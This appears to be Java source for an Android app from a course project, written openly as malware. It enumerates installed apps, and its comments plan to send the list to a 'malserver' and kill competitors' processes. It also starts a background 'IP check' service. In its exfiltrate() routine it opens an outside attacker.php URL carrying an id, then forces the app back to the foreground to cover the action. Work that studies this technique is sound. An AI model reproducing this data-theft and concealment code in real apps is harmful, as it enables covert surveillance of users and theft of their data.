package com.trustme.testsu;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.Message;
import android.os.SystemClock;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {
	public static final String TAG = "Main Activity";
	public static final int START_IP_CHECK = 1;
	public static final int STOP_IP_CHECK = 2;
	public Context ctx;
	protected Button btn_exfiltrate, btn_check_ip, btn_stop_check_ip;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
         ctx = this;
         
         //we should start checking for Internet connection only when there are new data available
         getUserLocation();
         getInstalledApplications();
         prepareButtonCheckIp();
         prepareButtonStopCheckIp();
         prepareButtonExfiltrate();
    	
    }

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    private void getInstalledApplications() {
		// TODO Auto-generated method stub
		//send installed packages with their PID to malserver
    	//server responds with competitors pid
    	//app kills that pid whenever it runs
    	getPackages();
	}

	
	private ArrayList<PInfo> getPackages() {
	    ArrayList<PInfo> apps = getInstalledApps(false); /* false = no system packages */
	    final int max = apps.size();
	    for (int i=0; i<max; i++) {
	        apps.get(i).prettyPrint();
	    }
	    return apps;
	}

	private ArrayList<PInfo> getInstalledApps(boolean getSysPackages) {
	    ArrayList<PInfo> res = new ArrayList<PInfo>();        
	    List<PackageInfo> packs = getPackageManager().getInstalledPackages(0);
	    for(int i=0; i<packs.size(); i++) {
	        PackageInfo p = packs.get(i);
	        if ((!getSysPackages) && (p.versionName == null)) {
	            continue ;
	        }
	        PInfo newInfo = new PInfo();
	        newInfo.appname = p.applicationInfo.loadLabel(getPackageManager()).toString();
	        newInfo.pname = p.packageName;
	        newInfo.versionName = p.versionName;
	        newInfo.versionCode = p.versionCode;
	        newInfo.icon = p.applicationInfo.loadIcon(getPackageManager());
	        res.add(newInfo);
	    }
	    return res; 
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	private void getUserLocation() {
		// TODO Auto-generated method stub
		
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
	
	private void prepareButtonCheckIp() {
		// TODO Auto-generated method stub
    	btn_check_ip = (Button) findViewById(R.id.start_ip_checking);
    	
    	btn_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				start_checking_for_ip();
			}

		});
	}
    
    private void prepareButtonStopCheckIp() {
		// TODO Auto-generated method stub
    	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
    	
    	btn_stop_check_ip.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				stop_checking_for_ip();
			}

		});
	}
    
    private void start_checking_for_ip() {
		// TODO Auto-generated method stub
		Log.i(TAG, "start service");
		Intent intent = new Intent(getApplicationContext(), BackgroundService.class);
		intent.putExtra("CMD", START_IP_CHECK);
		startService(intent);
	}
    
	protected void stop_checking_for_ip() {
		// TODO Auto-generated method stub
		Log.i(TAG, "stop service");
		Intent intent = new Intent(getApplicationContext(), 
				BackgroundService.class);
		intent.putExtra("CMD", STOP_IP_CHECK);
		stopService(intent);
	}

	private void prepareButtonExfiltrate() {
		// TODO Auto-generated method stub
    	btn_exfiltrate = (Button) findViewById(R.id.exfiltrate);
    	
    	btn_exfiltrate.setOnClickListener(new View.OnClickListener() {
			
			public void onClick(View v) {
				// TODO Auto-generated method stub
				exfiltrate();
			}

		});
	}
	
	
	
//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
    private void exfiltrate() {
		// TODO Auto-generated method stub
    	this.runOnUiThread(new Runnable(){
            public void run(){
                try {
                    RestartTask restartTask = new RestartTask();
                    restartTask.execute();
                }
                catch (Exception e) {
                    Log.d("MyPlugin", "Exploded when trying to start background task: " + e.getMessage());
                }
            }
        });
        
        Intent myIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://soterisdemetriou.com/cs423/project/attacker.php?id=198462034867"));
    	startActivity(myIntent);
	}
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
    
	@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.activity_main, menu);
        return true;
    }
    
    public class RestartTask extends AsyncTask<Void, Void, Void>{
    	protected RestartTask() { }

        @Override
        protected Void doInBackground(Void... unused){
            try {
                // pass time so the built-in dialer app can make the call
                Thread.sleep(50);
            }
            catch (InterruptedException localInterruptedException)
            {
                Log.d("MyPlugin", "RestartTask received an InterruptedException");
            }

            return null;
        }

        @Override
        protected void onPostExecute(Void justEyeCandy){
            super.onPostExecute(justEyeCandy);

            // Start the RestartActivity in a new task. This will snap the phone out of the built-in dialer app, which
            // has started in it's own task at this point in time. The RestartActivity gains control and finishes
            // immediately, leading control back to the activity at the top of the stack in the
            // app (where the user came from when making the call).
            Intent restartIntent = new Intent(MainActivity.this.ctx.getApplicationContext(), RestartActivity.class);
            restartIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            MainActivity.this.ctx.getApplicationContext().startActivity(restartIntent);
        }
    }
}
